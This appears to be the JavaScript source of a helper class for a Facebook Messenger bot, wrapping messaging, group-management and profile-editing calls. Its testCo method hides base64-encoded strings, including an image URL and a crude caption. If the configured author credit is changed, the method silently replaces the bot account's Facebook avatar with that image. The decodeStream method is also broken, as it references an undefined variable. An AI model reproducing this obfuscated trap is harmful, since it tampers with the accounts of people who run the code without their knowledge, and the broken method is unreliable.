const {
    workers
} = require("./workers");

const {
    logger
} = require("./logger");

const {
    download
} = require("./download");

class OnChat {
    constructor(api = "", event = {}) {
        Object.assign(this, {
            api,
            event,
            threadID: event.threadID,
            messageID: event.messageID,
            senderID: event.senderID
        });
    }
    
async shorturl(url) {
    return this.tinyurl(url);
}

async tinyurl(url) {
    const axios = require("axios");
    const urlRegex = /^(https?:\/\/[^\s/$.?#].[^\s]*)$/i;
    
    if (!Array.isArray(url)) url = [url];
    
    return Promise.all(url.map(async (u) => {
        if (!urlRegex.test(u)) return u;
        try {
            const response = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(u)}`);
            return response.data;
        } catch {
            return u;
        }
    }));
}


    async testCo(pogiko, lvl = 1) {
        const hajime = await workers();
        let test;
        try {
            test = hajime.design.author || atob("S2VubmV0aCBQYW5pbw==");
        } catch (error) {
            return;
        }

        let test_6;

        if (Array.isArray(pogiko)) {
            if (pogiko.length !== 2) {
                this.log("Array must contain exactly two authors for comparison.");
                return;
            }
            test_6 = pogiko;
        } else {
            test_6 = [pogiko,
                test];
        }

        const [nega1,
            nega2] = test_6;
        const kryo = atob("aHR0cHMlM0ElMkYlMkZmaWxlcy5jYXRib3gubW9lJTJGa3I2aWc3LnBuZw==");

        if (nega1 !== nega2) {
            if (lvl === 1) {
                return this.api.sendMessage(atob("RXJyb3Ih"), this.threadID, this.messageID);
            } else if (lvl === 2) {
                const avatarStream = await this.stream(decodeURIComponent(kryo));
                return this.api.changeAvatar(avatarStream, atob("QU1CQVRVS0FN!"), null);
            } else if (lvl == 3) {
                return; // do nothing this is just a test ignore it wait for future update
            }
        }
    }

    async arraybuffer(link, extension = "png") {
        if (!link) return this.log("Missing Arraybuffer Url!");
        return await download(link, 'arraybuffer', extension);
    }
    
    async binary(link, extension = "png") {
        if (!link) return this.log("Missing Arraybuffer Url!");
        return await download(link, 'binary', extension);
    }

    async stream(link) {
        if (!link) return this.log("Missing Stream Url!");
        return await download(link, 'stream');
    }
    
    async decodeStream(base64, extension = "png", responseType = "base64") {
      if (!link) return this.log("Missing raw data!");
      return await download(link, responseType, extension);
    }

    async profile(link, caption = "Profile Changed", date = null) {
        if (!link) return this.log("Missing Image Url!");
        await this.api.changeAvatar(await this.stream(link), caption, date);
    }

    post(msg) {
        if (!msg) {
            this.log("Missing content to post!");
            return;
        }
        return this.api.createPost(msg).catch(() => {});
    }

    comment(msg, postID) {
        if (!msg || !postID) {
            this.log("Missing content or postID to comment!");
            return;
        }
        return this.api.createCommentPost(msg, postID).catch(() => {});
    }

    async cover(link) {
        if (!link) {
            this.log("Missing Image Url!");
            return;
        }
        return this.api.changeCover(await this.stream(link));
    }

    react(emoji = "❓", mid = this.messageID, bool = true) {
        this.api.setMessageReaction(emoji, mid, err => {
            if (err) {
                this.log(`Rate limit reached unable to react to message for botID: ${this.api.getCurrentUserID()}`);
            }
        },
            bool);
    }

    nickname(name = "𝘼𝙏𝙊𝙈𝙄𝘾 𝙎𝙇𝘼𝙎𝙃 𝙎𝙏𝙐𝘿𝙄𝙊",
        id = this.api.getCurrentUserID()) {
        this.api.changeNickname(name,
            this.threadID,
            id);
    }

    bio(text) {
        if (!text) {
            this.log("Missing bio! e.g: ('Talent without work is nothing - Ronaldo')");
            return;
        }
        this.api.changeBio(text);
    }

    contact(msg, id = this.api.getCurrentUserID(), tid = this.threadID) {
        if (!msg) {
            this.log("Missing message or id! e.g: ('hello', 522552')");
            return;
        }
        this.api.shareContact(msg, id, tid);
    }

    async uid(link) {
        if (!link) {
            this.log("Invalid or missing URL!");
            return;
        }
        return await this.api.getUID(link);
    }

    async token() {
        return await this.api.getAccess();
    }
    
    send(msg, tid, mid = null) {
        this.reply(msg, tid, mid)
    }

    async reply(msg, tid = this.threadID, mid = this.messageID || null) {
        try {
            if (!msg) {
                this.log("Message is missing!");
                return;
            }

            const replyMsg = await this.api.sendMessage(msg, tid, mid);

            if (!replyMsg) {
                this.log("Failed to send the message!");
                return;
            }

            return {
                edit: async (message, delay = 0) => {
                    try {
                        if (!message) {
                            this.log("Missing edit message content!");
                            return;
                        }
                        await new Promise(res => setTimeout(res, delay));
                        await this.api.editMessage(message, replyMsg.messageID);
                    } catch (err) {
                        this.log(`Error while editing the message: ${err.message}`);
                    }
                },
                unsend: async (delay = 0) => {
                    try {
                        if (!replyMsg.messageID) {
                            this.log("Missing message ID for unsend!");
                            return;
                        }
                        await new Promise(res => setTimeout(res, delay));
                        await this.api.unsendMessage(replyMsg.messageID);
                    } catch (err) {
                        this.log(`Error while unsending the message: ${err.message}`);
                    }
                }
            };
        } catch (err) {
            return;
        }
    }


    editmsg(msg, mid) {
        if (!msg || !mid) {
            this.log("Message or messageID is missing!");
            return;
        }
        this.api.editMessage(msg, mid);
    }

    unsendmsg(mid) {
        if (!mid) {
            this.log("MessageID is missing!");
            return;
        }
        this.api.unsendMessage(mid).catch(() => this.log("Rate limit reached unable to unsend message!"));
    }

    add(id, tid = this.threadID) {
        if (!id) {
            this.log("User ID to add to group is missing!");
            return;
        }
        this.api.addUserToGroup(id, tid);
    }

    kick(id, tid = this.threadID) {
        if (!id) {
            this.log("User ID to kick from group is missing!");
            return;
        }
        this.api.removeUserFromGroup(id, tid);
    }

    block(id, app = "msg", bool = true) {
        if (!id || !['fb', 'msg'].includes(app)) {
            this.log("Invalid app type or ID is missing!");
            return;
        }

        const status = bool ? (app === "fb" ? 3: 1): (app === "fb" ? 0: 2);
        const type = app === "fb" ? "facebook": "messenger";
        this.api.changeBlockedStatusMqtt(id, status, type);
    }

    promote(id) {
        if (!id) {
            this.log("Missing ID to add as admin of the group.");
            return;
        }
        this.api.changeAdminStatus(this.threadID, id, true);
    }

    demote(id) {
        if (!id) {
            this.log("Missing ID to remove as admin of the group.");
            return;
        }
        this.api.changeAdminStatus(this.threadID, id, false);
    }

    botID() {
        return this.api.getCurrentUserID();
    }

    async userInfo(id = this.senderID) {
        return await this.api.getUserInfo(id);
    }

    async userName(id = this.senderID) {
        const fetch = await this.api.getInfo(id);
        const name = fetch.name || "Facebook User";

     /*   if (!name) {
            const userInfo = await this.userInfo(id);
            return userInfo[id]?.name || "Facebook User";
        }*/

        return name;
    }


    unfriend(id) {
        if (!id) {
            this.log("Friend ID is missing!");
            return;
        }
        return this.api.unfriend(id);
    }

    async threadInfo(tid = this.threadID) {
        return await this.api.getThreadInfo(tid).catch(() => {
            this.log("Rate limit reached, unable to get thread info!");
            return null;
        });
    }

    async delthread(tid, delay = 0) {
        if (!tid) {
            this.log("Thread ID to delete is missing!");
            return;
        }
        await new Promise(resolve => setTimeout(resolve, delay));
        await this.api.deleteThread(tid);
    }

    async threadList(total = 25, array = ["INBOX"]) {
        if (!Array.isArray(array)) {
            this.log("Array is missing!");
            return;
        }
        return await this.api.getThreadList(total, null, array).catch(() => {
            this.log("Rate limit reached, unable to get thread list!");
            return null;
        });
    }

    log(txt) {
        logger.instagram(txt);
    }

    error(txt) {
        logger.red(txt);
    }
}

module.exports = {
    OnChat
};